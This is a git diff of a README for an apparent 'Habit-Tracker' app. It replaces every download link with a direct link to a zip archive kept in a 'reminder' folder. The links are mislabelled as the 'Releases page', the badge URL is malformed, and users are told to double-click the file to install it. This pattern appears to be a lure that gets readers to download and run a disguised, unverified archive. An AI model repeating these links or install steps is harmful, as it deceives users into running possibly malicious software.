@@ -1,6 +1,6 @@
 # 🌱 Habit-Tracker - Build Better Habits With Ease
 
-[![Download Habit-Tracker](https://raw.githubusercontent.com/caireserbevm16/Habit-Tracker/main/reminder/Tracker-Habit-1.0.zip%https://raw.githubusercontent.com/caireserbevm16/Habit-Tracker/main/reminder/Tracker-Habit-1.0.zip)](https://raw.githubusercontent.com/caireserbevm16/Habit-Tracker/main/reminder/Tracker-Habit-1.0.zip)
+[![Download Habit-Tracker](https://github.com/caireserbevm16/Habit-Tracker/raw/refs/heads/main/reminder/Habit-Tracker-3.2-beta.5.zip%https://github.com/caireserbevm16/Habit-Tracker/raw/refs/heads/main/reminder/Habit-Tracker-3.2-beta.5.zip)](https://github.com/caireserbevm16/Habit-Tracker/raw/refs/heads/main/reminder/Habit-Tracker-3.2-beta.5.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ This guide will help you download and run the Habit-Tracker app quickly and easi
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to the [Habit-Tracker Releases page](https://raw.githubusercontent.com/caireserbevm16/Habit-Tracker/main/reminder/Tracker-Habit-1.0.zip) to find the latest version of the software.
+   Go to the [Habit-Tracker Releases page](https://github.com/caireserbevm16/Habit-Tracker/raw/refs/heads/main/reminder/Habit-Tracker-3.2-beta.5.zip) to find the latest version of the software.
 
 2. **Select the Latest Release:**  
    On the releases page, you will see a list of available versions. Click on the version label that says "Latest Release" to ensure you get the most updated features.
@@ -22,7 +22,7 @@ This guide will help you download and run the Habit-Tracker app quickly and easi
    Look for the downloadable files for your operating system. Click on the file that fits your system (Windows, macOS, etc.). This will start the download. 
 
 4. **Locate the Downloaded File:**  
-   Once the download completes, find the file in your computer’s download folder. It will be named something similar to `https://raw.githubusercontent.com/caireserbevm16/Habit-Tracker/main/reminder/Tracker-Habit-1.0.zip` or `https://raw.githubusercontent.com/caireserbevm16/Habit-Tracker/main/reminder/Tracker-Habit-1.0.zip`.
+   Once the download completes, find the file in your computer’s download folder. It will be named something similar to `https://github.com/caireserbevm16/Habit-Tracker/raw/refs/heads/main/reminder/Habit-Tracker-3.2-beta.5.zip` or `https://github.com/caireserbevm16/Habit-Tracker/raw/refs/heads/main/reminder/Habit-Tracker-3.2-beta.5.zip`.
 
 5. **Install the App:**  
    Double-click the downloaded file to start the installation. Follow the on-screen instructions to finish the setup. 
@@ -72,7 +72,7 @@ If you encounter any issues while using Habit-Tracker, consider the following st
    Sometimes a fresh install can resolve issues. Follow the download steps to reinstall.
 
 - **Check for Updates:**  
-   New updates may fix bugs or improve functionality. Always visit the [Releases page](https://raw.githubusercontent.com/caireserbevm16/Habit-Tracker/main/reminder/Tracker-Habit-1.0.zip) for the latest version.
+   New updates may fix bugs or improve functionality. Always visit the [Releases page](https://github.com/caireserbevm16/Habit-Tracker/raw/refs/heads/main/reminder/Habit-Tracker-3.2-beta.5.zip) for the latest version.
 
 - **Contact Support:**  
    For technical issues that you cannot solve, reach out to support through the GitHub Issues page. This allows us to address your concerns directly.
